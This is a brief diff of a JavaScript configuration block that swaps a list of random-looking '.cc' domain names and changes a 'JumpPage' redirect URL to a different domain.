@@ -37,12 +37,12 @@ var emails = [
 ];
 
 var urls=[
-	'elqpbtlo.cc/', 
-	'mxzbixqd.cc/', 
-    'elqpbtlo.cc/',
+	'ak29x31k.cc',
+	'uwvenpqks.cc',
+	'elqpbtlo.cc',
 ];                                                                                                                  
 
-var JumpPage="https://kaekhteok.cc";
+var JumpPage="https://aicrdj3.com";
 
 var newestUrls = [];
 
